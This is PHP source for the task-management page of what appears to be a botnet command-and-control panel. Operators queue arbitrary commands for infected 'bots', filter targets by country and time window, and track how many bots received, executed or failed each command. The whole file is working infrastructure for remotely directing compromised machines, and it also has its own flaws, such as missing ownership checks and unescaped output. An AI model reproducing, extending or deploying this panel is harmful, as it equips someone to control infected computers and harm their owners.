<?php
if (getRole() > 2)
	$TEMPLATE['text'] = '<div class="alert alert-danger">'.$GLOBALS['LANG']['err_no_permission'].'</div>';
else
{
	if (isset($_GET['a']) && $_GET['a'] == "add")
	{
		$TEMPLATE['text'] = '';
		if ($_POST && isset($_POST['cmd']) && isset($_POST['cnt']) && isset($_POST['start']) && isset($_POST['stop']))
		{
			$countries = '';
			if (isset($_POST['countries']))
			{
				if (is_array($_POST['countries']))
				{
					foreach ($_POST['countries'] as $country)
						$countries .= ','.$country;
				}
				else
					$countries = $_POST['countries'];
			}
			db_query("INSERT INTO `tasks`(`command`, `count`, `start`, `stop`, `countries`, `uid`) VALUES(:1, :2, :3, :4, :5, :6)",
				$_POST['cmd'], intval($_POST['cnt']),
				date("Y-m-d H:i:s", strtotime($_POST['start'])),
				date("Y-m-d H:i:s", strtotime($_POST['stop'])),
				$countries, getUID());
			$TEMPLATE['text'] .= '<div class="alert alert-success">'.$GLOBALS['LANG']['added_task'].'</div>';
		}
		$TEMPLATE['site'] = $GLOBALS['LANG']['add_task'];
		$TEMPLATE['text'] .= '<form action="'.$_SERVER['SCRIPT_NAME'].'?p=tasks&a=add" method="POST" role="form">
							<input type="text" class="form-control" placeholder="'.$GLOBALS['LANG']['command'].'" name="cmd" required autofocus>
							<input type="text" class="form-control" placeholder="'.$GLOBALS['LANG']['count'].'" name="cnt" required>
							<select class="form-control" name="'.$GLOBALS['LANG']['countries'].'" multiple>';
		$stmt = db_query("SELECT `country` FROM `bots` WHERE `uid` = :1 OR `uid` = -1 GROUP BY `country` ORDER BY `country`", getUID());
		while ($row = $stmt->fetch())
			$TEMPLATE['text'] .= "<option value=\"{$row['country']}\">{$row['country']}</option>";
		$TEMPLATE['text'] .= '	<option value=""></option>
							</select>
							<div class="input-daterange input-group" id="datepicker" style="width: 100%;">
								<input type="text" class="input-sm form-control" name="start" />
								<span class="input-group-addon">'.$GLOBALS['LANG']['to'].'</span>
								<input type="text" class="input-sm form-control" name="stop" />
							</div>
							<button class="btn btn-lg btn-primary btn-block" type="submit">'.$GLOBALS['LANG']['create_task'].'</button>
							</form>';
	}
	elseif (isset($_GET['a']) && isset($_GET['id']) && $_GET['a'] == "edit")
	{
		$TEMPLATE['text'] = '';
		if ($_POST && isset($_POST['cmd']) && isset($_POST['cnt']) && isset($_POST['start']) && isset($_POST['stop']))
		{
			$countries = '';
			if (isset($_POST['countries']))
			{
				if (is_array($_POST['countries']))
				{
					foreach ($_POST['countries'] as $country)
						$countries .= ','.$country;
				}
				else
					$countries = $_POST['countries'];
			}
			db_query("UPDATE `tasks` SET `command` = :1, `count` = :2, `countries` = :3, `start` = :4, `stop` = :5 WHERE `id` = :6",
				$_POST['cmd'], intval($_POST['cnt']), $countries,
				date("Y-m-d H:i:s", strtotime($_POST['start'])),
				date("Y-m-d H:i:s", strtotime($_POST['stop'])),
				$_GET['id']);
			$TEMPLATE['text'] .= '<div class="alert alert-success">'.$GLOBALS['LANG']['updated_task'].'</div>';
		}
		$TEMPLATE['site'] = $GLOBALS['LANG']['edit_task'];
		$stmt = db_query("SELECT * FROM `tasks` WHERE `id` = :1", intval($_GET['id']));
		if ($stmt->rowCount() > 0)
		{
			$row = $stmt->fetch();
			$TEMPLATE['text'] .= '<form action="'.$_SERVER['SCRIPT_NAME'].'?p=tasks&a=edit&id='.$row['id'].'" method="POST" role="form">
							<input type="text" class="form-control" placeholder="'.$GLOBALS['LANG']['command'].'" name="cmd" value="'.$row['command'].'" required autofocus>
							<input type="text" class="form-control" placeholder="'.$GLOBALS['LANG']['count'].'" name="cnt" value="'.$row['count'].'" required>
							<select class="form-control" name="countries" multiple>';
			$countries = explode(",", $row['countries']);
			$stmt = db_query("SELECT `country` FROM `bots` WHERE `uid` = :1 OR `uid` = -1 GROUP BY `country` ORDER BY `country`", getUID());
			while ($row2 = $stmt->fetch())
				$TEMPLATE['text'] .= "<option value=\"{$row2['country']}\" ".(in_array($row2['country'], $countries) ? 'selected' : '').">{$row2['country']}</option>";
			$TEMPLATE['text'] .= '	<option value=""></option>
							</select>
							<div class="input-daterange input-group" id="datepicker" style="width: 100%;">
								<input type="text" class="input-sm form-control" name="start" value="'.date("m/d/Y", strtotime($row['start'])).'" />
								<span class="input-group-addon">'.$GLOBALS['LANG']['to'].'</span>
								<input type="text" class="input-sm form-control" name="stop" value="'.date("m/d/Y", strtotime($row['stop'])).'" />
							</div>
							<button class="btn btn-lg btn-primary btn-block" type="submit">'.$GLOBALS['LANG']['save_task'].'</button>
							</form>';
		}
		else
			$TEMPLATE['text'] .= '<div class="alert alert-danger">'.$GLOBALS['LANG']['couldnt_find_task'].'</div>';
	}
	else
	{
		$TEMPLATE['text'] = '';
		if (isset($_GET['a']) && $_GET['a'] == "del" && isset($_GET['id']))
		{
			$stmt = db_query("SELECT `id` FROM `tasks` WHERE `id` = :1", intval($_GET['id']));
			if ($stmt->rowCount() > 0)
			{
				$row = $stmt->fetch();
				db_query("DELETE FROM `tasks` WHERE `id` = :1", intval($_GET['id']));
				$TEMPLATE['text'] .= '<div class="alert alert-info">'.$GLOBALS['LANG']['deleted_task'].$row['id'].'.</div>';
			}
			else
				$TEMPLATE['text'] .= '<div class="alert alert-danger">'.$GLOBALS['LANG']['couldnt_find_tasks'].'</div>';
		}
		$TEMPLATE['site'] = "Tasks";
		$TEMPLATE['text'] .= '<a href="?p=tasks&a=add" class="btn btn-success pull-right"><i class="glyphicon glyphicon-plus"></i> '.$GLOBALS['LANG']['add_task'].'</a
							<div style="height: 10px;"></div>
								<table class="table table-hover">
									<tr>
										<th>#</th>
										<th>'.$GLOBALS['LANG']['command'].'</th>
										<th>'.$GLOBALS['LANG']['countries'].'</th>
										<th>'.$GLOBALS['LANG']['count'].'</th>
										<th>'.$GLOBALS['LANG']['state'].'</th>
										<th>'.$GLOBALS['LANG']['starts_at'].'</th>
										<th>'.$GLOBALS['LANG']['ends_at'].'</th>
										<th></th>
									</tr>';
		$LIMIT = isset($_GET['n']) ? sprintf("%d, %d", intval($_GET['n']), (intval($_GET['n']) + 10)) : '0, 10';
		$stmt = db_query("SELECT * FROM `tasks` WHERE `uid` = :1 OR `uid` = -1 ORDER BY `start` DESC LIMIT ".$LIMIT, getUID());
		while ($row = $stmt->fetch())
		{
			$TEMPLATE['text'] .= "	<tr>
										<td>{$row['id']}</td>
										<td>".htmlentities($row['command'])."</td>
										<td>{$row['countries']}</td>
										<td>{$row['count']}</td>
										<td>{$row['received']}/<font color=\"green\">{$row['executed']}</font>/<font color=\"red\">{$row['failed']}</font></td>
										<td>{$row['start']}</td>
										<td>{$row['stop']}</td>
										<td style=\"width: 100px;\">
											<a href=\"?p=tasks&a=del&id={$row['id']}\" class=\"btn btn-danger\"><i class=\"glyphicon glyphicon-trash\"></i></a>
											<a href=\"?p=tasks&a=edit&id={$row['id']}\" class=\"btn btn-primary\"><i class=\"glyphicon glyphicon-wrench\"></i></a>
										</td>
									</tr>";
		}
		$TEMPLATE['text'] .= '	</table>';
	}
}
					
$TEMPLATE['js'] = '<script>$(\'#datepicker\').datepicker({});</script>';
?>